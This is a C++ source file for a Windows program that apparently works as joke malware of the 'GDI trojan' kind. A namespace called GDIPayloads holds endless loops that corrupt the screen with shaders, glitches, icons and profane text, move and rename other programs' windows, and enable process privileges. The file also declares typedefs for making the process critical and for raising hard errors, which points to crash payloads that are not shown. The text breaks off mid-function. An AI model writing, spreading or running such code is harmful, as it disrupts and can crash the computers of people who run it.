#include <windows.h>
#include <vector>
#include <random>
#include <math.h>

#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "winmm.lib")

#include "hexadump.h"

#define M_PI   3.14159265358979323846264338327950288

#define GLITCH 0x1900AC010E
#define SRCRAINBOW 0x922222

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

struct WindowInfo
{
    HWND hwnd;
    int generation;
    bool moving;
};

static std::vector<WindowInfo> WindowMoveVar;

typedef VOID
(_stdcall* RtlSetProcessIsCritical)
(
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon
);

enum
{
    MEM_ALLOC_TYPES = MEM_COMMIT | MEM_RESERVE,
    FILE_CREATE = FILE_SHARE_READ | FILE_SHARE_WRITE,
    WINPOSFLAGS = SWP_NOSIZE | SWP_NOACTIVATE
};

typedef union
{
	struct RGBSTRUCT
	{
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE reserved;
	};

	COLORREF rgb;
	RGBSTRUCT color;
} RGBQUAD_t;

struct PolygonNode
{
    float x, y;
    float vx, vy;
};

typedef RGBQUAD_t* PRGBQUAD_t;


typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

static float HueToRGB(float p, float q, float t)
{
    if (t < 0.0f) t += 1.0f;
    if (t > 1.0f) t -= 1.0f;
    if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
    if (t < 1.0f / 2.0f) return q;
    if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
    return p;
}

RGBQUAD_t HSLtoRGB(HSL hsl)
{
    RGBQUAD_t rgb;
    rgb.color.reserved = 0;

    if (hsl.s == 0.0f)
    {
        BYTE val = (BYTE)(hsl.l * 255.0f);
        
        rgb.color.r = val;
        rgb.color.g = val;
        rgb.color.b = val;
    }

    else
    {
        float q =
            (hsl.l < 0.5f) ? (hsl.l * (1.0f + hsl.s)) :
            (hsl.l + hsl.s - hsl.l * hsl.s);

        float p = 2.0f * hsl.l - q;

        rgb.color.r = (BYTE)(HueToRGB(p, q, hsl.h + 1.0f / 3.0f) * 255.0f);
        rgb.color.g = (BYTE)(HueToRGB(p, q, hsl.h) * 255.0f);
        rgb.color.b = (BYTE)(HueToRGB(p, q, hsl.h - 1.0f / 3.0f) * 255.0f);
    }

    return rgb;
}

HSL RGBtoHSL(RGBQUAD_t rgb)
{
    float r = rgb.color.r / 255.0f;
    float g = rgb.color.g / 255.0f;
    float b = rgb.color.b / 255.0f;

    float max = fmaxf(r, fmaxf(g, b));
    float min = fminf(r, fminf(g, b));
    float h, s, l = (max + min) / 2.0f;

    if (max == min)
    {
        h = s = 0;
    }

    else
    {
        float d = max - min;
        s = l > 0.5f ? d / (2 - max - min) : d / (max + min);
        if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
        else if (max == g) h = (b - r) / d + 2;
        else h = (r - g) / d + 4;
        h /= 6;
    }

    return { h, s, l };
}

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}


int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

#define SAMPLE_RATE_A 11025
#define SAMPLE_RATE_B 22050
#define SAMPLE_RATE_C 44000

int SECONDS = 30;

#define BUFFER_SIZE_A (SAMPLE_RATE_A * SECONDS)
#define BUFFER_SIZE_B (SAMPLE_RATE_B * SECONDS)
#define BUFFER_SIZE_C (SAMPLE_RATE_C * SECONDS)

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);

    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);

    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

VOID PressKey(WORD key, INT time)
{
    INPUT pInputs = { 0 };

    pInputs.type = INPUT_KEYBOARD;
    pInputs.ki.wVk = key;

    SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));

    Sleep(time);

    pInputs.ki.dwFlags = KEYEVENTF_KEYUP;

    SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
    const WCHAR* labelText = L"I WANT TO MAKE POOP" + rand() % 128;

    if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
    {
        SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
    }

    return true;
}


BOOL CALLBACK WindowsMoving(HWND hwnd, LPARAM lParam) // Credits to N17Pro3426
{
    if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) return TRUE;

    int nx = (rand() % (w / 28)) + 10;
    int ny = (rand() % (h / 28)) + 10;

    int nw = (rand() % (w / 2)) + 100;
    int nh = (rand() % (h / 2)) + 100;
    SetWindowPos(hwnd, HWND_TOP, nx, ny, nw, nh, WINPOSFLAGS);

    return TRUE;
}


namespace GDIPayloads
{
    DWORD WINAPI IconsA(LPVOID lpParam)
    {
        int xf = 0;
        int yf = 0;
        int signX = 15;
        int signY = 5;
        int signX1 = 1;
        int signY1 = 1;
        int incrementor = 10;
        int radius = 50.0f;
        double angle = 0;
        int x, y;
        int centerX, centerY;

        int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);

        while (true)
        {
            HDC hdc = GetDC(0);
            xf += signX;
            yf += signY;
            centerX = origX - (w / 4), centerY = origY - (h / 4);
            x = (cos(angle) * radius) + centerX, y = (tan(angle) * radius) + centerY;

            int icon_x = GetSystemMetrics(SM_CXICON);
            int icon_y = GetSystemMetrics(SM_CYICON);

            for (INT i = 64; i > 8; i -= 8)
            {
                DrawIconEx
                (
                    hdc,
                    (50 + x - i + xf) - icon_x,
                    (50 + y - i + yf) - icon_y,
                    LoadIcon(0, IDI_WARNING),
                    2 * GetSystemMetrics(SM_CXICON),
                    2 * GetSystemMetrics(SM_CYICON),
                    0,
                    NULL, DI_NORMAL
                );
            }

            angle = fmod(angle + M_PI / radius, M_PI * radius);

            if (yf == 0)
            {
                signY = 5;
            }

            if (xf == 0)
            {
                signX = 15;
            }

            if (yf >= GetSystemMetrics(1))
            {
                signY -= 5;
            }

            if (xf >= GetSystemMetrics(0))
            {
                signX -= 15;
            }
            ReleaseDC(0, hdc);
            Sleep(10);
        }
        return(1);
    }

    DWORD WINAPI IconsC(LPVOID lpParam)
    {
        int xf = 0;
        int yf = 0;
        int signX = 15;
        int signY = 5;
        int signX1 = 1;
        int signY1 = 1;
        int incrementor = 10;
        int radius = 50.0f;
        double angle = 0;
        int x, y;
        int centerX, centerY;

        int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);

        while (1)
        {
            HDC hdc = GetDC(0);
            xf += signX;
            yf += signY;
            centerX = origX - (w / 4), centerY = origY - (h / 4);
            x = (cos(angle) * radius) + centerX, y = (sin(angle) * radius) + centerY;

            int icon_x = GetSystemMetrics(SM_CXICON);
            int icon_y = GetSystemMetrics(SM_CYICON);

            for (INT i = 64; i > 8; i -= 8)
            {
                DrawIconEx
                (
                    hdc,
                    (50 + x - i + xf) - icon_x,
                    (50 + y - i + yf) - icon_y,
                    LoadIcon(0, IDI_ERROR),
                    2 * GetSystemMetrics(SM_CXICON),
                    2 * GetSystemMetrics(SM_CYICON),
                    0,
                    NULL, DI_NORMAL
                );
            }

            angle = fmod(angle + M_PI / radius, M_PI * radius);

            if (yf == 0)
            {
                signY = 5;
            }

            if (xf == 0)
            {
                signX = 15;
            }

            if (yf >= GetSystemMetrics(1))
            {
                signY -= 5;
            }

            if (xf >= GetSystemMetrics(0))
            {
                signX -= 15;
            }
            ReleaseDC(0, hdc);
            Sleep(10);
        }
        return(1);
    }

	DWORD WINAPI GDIShader1(LPVOID lpParam)
	{
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc = (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        int t = 0;

        while (1)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            int numShifts = 400;
            for (int i = 0; i < numShifts; i++)
            {
                int x = rand() % w;
                int y = rand() % h;
                int dx = (rand() % 3) - 1;
                int dy = (rand() % 3) - 1;
                BitBlt(dcCopy, x + dx, y + dy, w - x, h - y, dcCopy, x, y, SRCCOPY);
            }

            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD_t));

            float div = (float)t / 30.0f;
            float a = sinf(div) * 8.0f;
            float b = cosf(div) * 2.0f;

            for (INT y = 0; y < h; y += 2)
            {
                int v = (y + (int)b) % h;
                if (v < 0) v += h;

                for (INT x = 0; x < w; x += 2)
                {
                    int u = (x + (int)a) % w;
                    if (u < 0) u += w;

                    RGBQUAD_t rgbDst = prgbSrc[v * w + u];
                    RGBQUAD_t rgbSrcPixel = prgbSrc[y * w + x];

                    rgbDst.color.r += ~rgbSrcPixel.color.r / 32;
                    rgbDst.color.g += ~rgbSrcPixel.color.g / 32;
                    rgbDst.color.b += ~rgbSrcPixel.color.b / 32;

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                prgbDst[targetY * w + targetX] = rgbDst;
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            t++;
            Sleep(10);
        }

        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(0, hdc);

        return 0;
	}

    DWORD WINAPI TextsA(LPVOID lpParam)
    {
        int r = 255;
        int g = 0;
        int b = 0;

        int state = 0;

        int signX = 1;
        int signY = 1;
        int signX1 = 1;
        int signY1 = 1;
        int incrementor = 10;
        int x = 10;
        int y = 10;

        while (true)
        {
            x += incrementor * signX;
            y += incrementor * signY;

            if (state == 0)
            {
                g += 5; if (g >= 255) state = 1;
            }

            else if (state == 1)
            {
                r -= 5; if (r <= 0) state = 2;
            }

            else if (state == 2)
            {
                b += 5; if (b >= 255) state = 3;
            }

            else if (state == 3)
            {
                g -= 5; if (g <= 0) state = 4;
            }

            else if (state == 4)
            {
                r += 5; if (r >= 255) state = 5;
            }

            else if (state == 5)
            {
                b -= 5; if (b <= 0) state = 0;
            }

            if (y >= h)
            {
                signY = -1;
            }

            else if (x >= w)
            {
                signX = -1;
            }

            else if (y == 0)
            {
                signY = 1;
            }

            else if (x == 0)
            {
                signX = 1;
            }

            HDC hdc = GetDC(NULL);

            SetBkMode(hdc, 0);

            int tw = 50;
            int th = 100;

            SetTextColor(hdc, RGB(r, g, b));

            HFONT Font =
            CreateFontA
            (
                th, tw, 1, rand() % 20,
                FW_REGULAR, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Impact"
            );

            SelectObject(hdc, Font);
            TextOutA(hdc, x, y, "fuck", strlen("fuck"));

            DeleteObject(Font);
            ReleaseDC(0, hdc);
            Sleep(10);
        }
    }

    DWORD WINAPI TextsB(LPVOID lpParam)
    {
        while (true)
        {
            HDC hdc = GetDC(NULL);

            SetBkMode(hdc, 0);

            int tw = rand() % 50;
            int th = rand() % 100;

            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

            HFONT Font =
            CreateFontA
            (
                th, tw, rand() % 20, rand() % 20,
                FW_REGULAR, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "System"
            );

            SelectObject(hdc, Font);
            TextOutA(hdc, rand() % w, rand() % h, "DimethylArsenic", strlen("DimethylArsenic"));

            DeleteObject(Font);
            ReleaseDC(0, hdc);
            Sleep(10);
        }
    }

    DWORD WINAPI GDIShader2(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt(x + y & y));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);

                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    DWORD WINAPI GDIShader3(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt(x & y ^ x));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                    hslcolor.l += 0.01;

                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    DWORD WINAPI GDIShader4(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt(x * y & y));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);


                    hslcolor.l *= 1.125f;

                    if (hslcolor.l > .5f)
                    {
                        hslcolor.l -= .5f;
                    }

                    if (hslcolor.l < .25f)
                    {
                        hslcolor.l += .25f;
                    }

                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    DWORD WINAPI GDIShader5(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        PRGBQUAD_t rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(dcCopy, hbmTemp);

        while (true)
        {
            hdc = GetDC(0);
            
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            
            for (int i = 0; i < w * h; i++)
            {
                int x = i % w, y = i / w;
                rgbScreen[i].rgb += x & y;
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCPAINT);
            BitBlt(hdc, 2, 0, w, h, hdc, 0, 2, SRCCOPY);
            
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
    }

    DWORD WINAPI GDIShader6(LPVOID lpParam) // old shader from Anotoxin.exe
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;

        PRGBQUAD_t rgbScreen = nullptr;
        HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
        SelectObject(dcCopy, hbmTemp);

        const int numNodes = 25;
        std::vector<PolygonNode> nodes(numNodes);
        for (int i = 0; i < numNodes; i++) {
            nodes[i].x = (float)(rand() % w);
            nodes[i].y = (float)(rand() % h);
            nodes[i].vx = (float)((rand() % 7) - 3);
            nodes[i].vy = (float)((rand() % 7) - 3);
            if (nodes[i].vx == 0) nodes[i].vx = 2.0f;
            if (nodes[i].vy == 0) nodes[i].vy = -2.0f;
        }

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            for (int i = 0; i < numNodes; i++)
            {
                nodes[i].x += nodes[i].vx;
                nodes[i].y += nodes[i].vy;

                if (nodes[i].x <= 0 || nodes[i].x >= w) nodes[i].vx *= -1;
                if (nodes[i].y <= 0 || nodes[i].y >= h) nodes[i].vy *= -1;
            }

            for (int y = 0; y < h; y += 2)
            {
                for (int x = 0; x < w; x += 2)
                {

                    int closestNodeIndex = 0;
                    float minDistanceSq = 99999999.0f;

                    for (int i = 0; i < numNodes; i++)
                    {
                        float dx = x - nodes[i].x;
                        float dy = y - nodes[i].y;
                        float distSq = dx * dx + dy * dy;

                        if (distSq < minDistanceSq)
                        {
                            minDistanceSq = distSq;
                            closestNodeIndex = i;
                        }
                    }

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                int idx = targetY * w + targetX;

                                rgbScreen[idx].color.r += 666 + (closestNodeIndex * 15);
                                rgbScreen[idx].color.g += 333 - (closestNodeIndex * 7);
                                rgbScreen[idx].color.b ^= (BYTE)(minDistanceSq);
                            }
                        }
                    }
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            Sleep(15);
        }

        DeleteObject(hbmTemp);
        DeleteDC(dcCopy);
        ReleaseDC(0, hdc);

        return 0;
    }

    DWORD WINAPI Blur(LPVOID lpParam)
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 1);

        POINT lppoint[3];

        while (true)
        {
            HDC hdc = GetDC(nullptr);
            HDC dcCopy = CreateCompatibleDC(hdc);
            HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
            HGDIOBJ holdbit = SelectObject(dcCopy, hbit);


            if (dis(gen) == 1)
            {
                lppoint[0] = { 5 + 5, 0 - 5 };
                lppoint[1] = { 5 - w, 0 + 2 };
                lppoint[2] = { h + 5, h - 3 };
            }

            else
            {
                lppoint[0] = { 0 - 2, 0 + 4 };
                lppoint[1] = { 5 + w, 0 - 5 };
                lppoint[2] = { h - 5, h + 3 };
            }

            PlgBlt(dcCopy, lppoint, hdc, 0, 0, w, h, nullptr, 0, 0);

            BLENDFUNCTION blend = { AC_SRC_OVER, 0, 60, 0 };
            AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blend);

            SelectObject(dcCopy, holdbit);
            DeleteObject(hbit);
            DeleteDC(dcCopy);
            ReleaseDC(nullptr, hdc);

            Sleep(1);
        }
    }

    DWORD WINAPI Glitch(LPVOID lpParam)
    {
        while (true)
        {
            HDC hdc = GetDC(0);
            HDC dcCopy = CreateCompatibleDC(hdc);

            HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(dcCopy, bm);

            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);

            PatBlt(hdc, 0, rand() % h, w, rand() % h, PATINVERT);
            Sleep(1);
            PatBlt(hdc, 0, rand() % h, w, rand() % h, PATPAINT);

            DeleteObject(brush);
            DeleteObject(dcCopy); DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }

    DWORD WINAPI UDStretch(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);

        float radius = 0.f;
        double angle = 0;

        while (1)
        {
            hdc = GetDC(0);

            float x = (cos(angle)) * radius;
            float y = (sin(angle)) * radius;

            StretchBlt(hdc, x, y, w - x * 2, h - y * 2, hdc, 0, 0, w, h, SRCCOPY);
            StretchBlt(hdc, x, y, w - x * 2, h - y * 2, hdc, 0, 0, w, h, SRCAND);
            radius += 0.1f;

            ReleaseDC(0, hdc);

            angle = fmod(angle + M_PI / radius, M_PI * radius) / 1.001;
        }
    }

    DWORD WINAPI InvertCircles(LPVOID lpParam)
    {
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        int w = rect.right - rect.left - 200, h = rect.bottom - rect.top - 200;

        for (int t = 0;; t++)
        {
            const int size = 500;
            
            int x = rand() % (w + size) - size / 14;
            int y = rand() % (h + size) - size / 14;

            for (int i = 0; i < size; i += 10)
            {
                ci(x - i / 2, y - i / 2, i, i);
                Sleep(25);
            }
        }
    }

    DWORD WINAPI GDIShader7(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = -h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc =
        (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        int t = 0;

        FLOAT div = (float)t / 30.f;

        FLOAT a = sin(div) * 2.0f;
        FLOAT b = cos(div) * 2.0f;

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD));
            RGBQUAD_t rgbDst;

            for (INT y = 0; y < h; y++)
            {
                for (INT x = 0; x < w; x++)
                {
                    UINT u = x + (INT)b;
                    UINT v = y + (INT)a;

                    if (rand() % 25 == 24)
                    {
                        u = x + (INT)a;
                        v = y + (INT)b;
                    }

                    else
                    {
                        u = x - (INT)a;
                        v = y - (INT)b;
                    }

                    u %= w;
                    v %= h;

                    rgbDst = prgbSrc[v * w + u];
                    rgbDst.color.r += ~prgbSrc[y * w + x].color.r * 54;
                    rgbDst.color.g += ~prgbSrc[y * w + x].color.g * 54;
                    rgbDst.color.b += ~prgbSrc[y * w + x].color.b * 54;
                    prgbDst[y * w + x] = rgbDst;
                }
            }

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);
            Sleep(10);
        }

        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    DWORD WINAPI GDIShader8(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ y + y));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                    hslcolor.l = 0.8f;

                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    DWORD WINAPI IconsB(LPVOID lpParam)
    {
        HICON hApplicationIcon;

        float t = 0.0f;
        const int gridSize = 90;

        while (true)
        {
            HDC hdc = GetDC(0);

            if (!hdc)
            {
                Sleep(10);
                continue;
            }

            for (int y = 0; y < h; y += gridSize)
            {
                for (int x = 0; x < w; x += gridSize)
                {
                    float waveX = sinf((y * 0.02f) + (t * 0.1f)) * 95.0f;
                    float waveY = cosf((x * 0.02f) + (t * 0.08f)) * 90.0f;

                    HINSTANCE lib = LoadLibraryA("moricons.dll");
                    hApplicationIcon = LoadIcon(lib, MAKEINTRESOURCE(rand() % 113));

                    int drawX = x + (int)waveX;
                    int drawY = y + (int)waveY;

                    DrawIcon(hdc, drawX, drawY, hApplicationIcon);
                }
            }

            ReleaseDC(NULL, hdc);

            t += 0.5f;
            Sleep(1);
        }

        return 0;
    }

    DWORD WINAPI IconsD(LPVOID lpParam)
    {
        HICON hApplicationIcon;
        int x = 10;
        int y = 10;
        int incrementor = rand() % 40;

        int signX = -1;
        int signY = -1;

        while (true)
        {
            HDC hdc = GetDC(HWND_DESKTOP);

            x += incrementor * signX;
            y += incrementor * signY;

            HINSTANCE lib = LoadLibraryA("shell32.dll");
            hApplicationIcon = LoadIcon(lib, MAKEINTRESOURCE(rand() % 113));

            int IconWidth = w / 12;
            int IconHeight = h / 12;

            DrawIconEx(hdc, x, y, hApplicationIcon, IconWidth, IconHeight, 0, NULL, DI_NORMAL);

            if (y >= h)
            {
                signY = -1;
            }

            if (x >= w)
            {
